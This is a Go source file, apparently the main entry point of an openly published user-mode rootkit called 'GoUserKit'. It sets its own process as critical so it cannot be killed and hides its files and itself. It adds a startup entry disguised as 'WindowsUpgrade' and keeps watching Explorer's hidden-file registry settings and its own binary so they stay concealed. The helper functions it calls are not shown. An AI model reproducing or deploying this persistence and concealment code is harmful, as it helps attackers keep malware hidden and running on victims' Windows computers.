package main

import (
	"GoUserKit/core"
	"fmt"
	"os"
	"syscall"
	"time"
)

var (
	name string = "Text"
)

func main() {
	fmt.Println("Go Based UserKit - https://github.com/SaturnsVoid")

	//Process Protection
	me, _ := syscall.GetCurrentProcess()
	core.SetInformationProcess(uintptr(me), 29, 1, 4)
	//Hide Files
	go core.HideFiles()
	go core.HideMe()

	//Basic Add to Windows Startup
	core.SimpleStartupName = "WindowsUpgrade"
	core.SimpleStartupPath = os.Args[0]
	go core.BasicStartup()
	//Maintain Simple Startup Registry
	go core.WatchRegistry("Software\\Microsoft\\Windows\\CurrentVersion\\Run", core.SimpleStartupName)
	//Maintain Hidden File Registry
	go core.WatchRegistry("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden")
	go core.WatchRegistry("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden")
	//Maintain if file is Hidden
	go core.WatchFiles(os.Args[0])
	//
	for {
		time.Sleep(5 * time.Second)
	}
}
